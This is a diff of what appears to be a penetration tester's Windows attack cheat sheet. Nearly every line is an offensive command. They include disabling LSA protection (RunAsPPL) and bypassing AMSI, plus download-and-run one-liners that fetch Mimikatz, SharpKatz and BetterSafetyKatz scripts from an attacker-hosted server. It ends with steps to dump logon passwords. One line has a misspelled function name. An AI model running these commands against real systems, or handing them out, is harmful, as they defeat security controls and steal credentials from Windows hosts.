@@ -176,7 +176,8 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 
 cd /opt/Nishang/Bypass/
 python3 -m http.server 80
 powershell -nop -exec bypass
-iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-AmsiBypass.ps1); Invoke-AmsiBypass -Verbose
+iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-AmsiBypass.ps1); Invoke-AmsiBypass -Method <method> -Verbose
+Methods: unload, unloadsilent, unloadobfuscated, unload2, dllhijack, psv2, obfuscation
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Persistence
@@ -285,10 +286,21 @@ sekurlsa::logonPasswords
 - PowerShell version of mimikatz
 cd /opt/Nishang/Gather/
 python3 -m http.server 80
-powershell -nop -exec bypass
+Open PowerShell as Administrator.
 Run AMSI bypass from above.
 iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-Mimikatz.ps1); Invoke-Mimikatz -Command privilege::debug
 iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-Mimikatz.ps1); Invoke-Mimikatz -Command sekurlsa::logonpasswords
+
+- PowerSharpPack
+cd /opt/PowerSharpPack/PowerSharpBinaries/
+python3 -m http.server 80
+Open PowerShell as Administrator.
+Run AMSI bypass from above.
+iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-SharpKatz.ps1); Invoke-SharpKatz
+
+iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-BetterSafetyKatz.ps1); Invoke-BetteerSafetyKatz
+privilege::debug
+sekurlsa::logonpasswords
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Lateral Movement
